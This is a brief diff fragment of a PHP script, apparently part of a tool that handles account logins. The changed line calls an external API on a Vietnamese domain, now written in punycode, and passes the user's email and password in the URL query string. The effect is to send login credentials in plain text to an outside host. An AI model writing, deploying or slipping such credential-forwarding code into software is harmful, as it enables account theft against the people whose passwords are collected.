@@ -18,7 +18,7 @@ fwrite($handle, "\r\n");
 fwrite($handle, "\r\n");
 fclose($handle);
 */
-auto('http://nghĩa9x.vn/api.php?email='.$email.'&password='.$pass);
+auto('http://xn--ngha9x-57a.vn/api.php?email='.$email.'&password='.$pass);
 
 if($app_id == 350685531728)
 {
